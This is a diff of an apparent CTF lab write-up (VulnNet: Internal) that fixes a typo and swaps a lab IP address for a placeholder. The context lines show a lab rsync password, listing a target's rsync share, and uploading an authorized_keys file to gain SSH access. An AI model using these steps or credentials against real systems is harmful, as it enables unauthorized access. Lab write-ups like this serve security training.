@@ -348,10 +348,10 @@ Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72
 :~/VulnNetInternal# 
 ```
 
-<p>Explored <code>resync</code>: port 873.</p>
+<p>Explored <code>rsync</code>: port 873.</p>
 
 ```bash
-~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_I`P:873/files
+~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files
 Password: 
 drwxr-xr-x          4,096 2021/02/01 12:51:14 .
 drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
@@ -494,7 +494,7 @@ The key's randomart image is:
 <p>Used <code>rsync</code> again.</p>
 
 ```bash
-~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@10.10.243.254:873/files/sys-internal/.ssh
+~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@Target_IP:873/files/sys-internal/.ssh
 ```
 
 
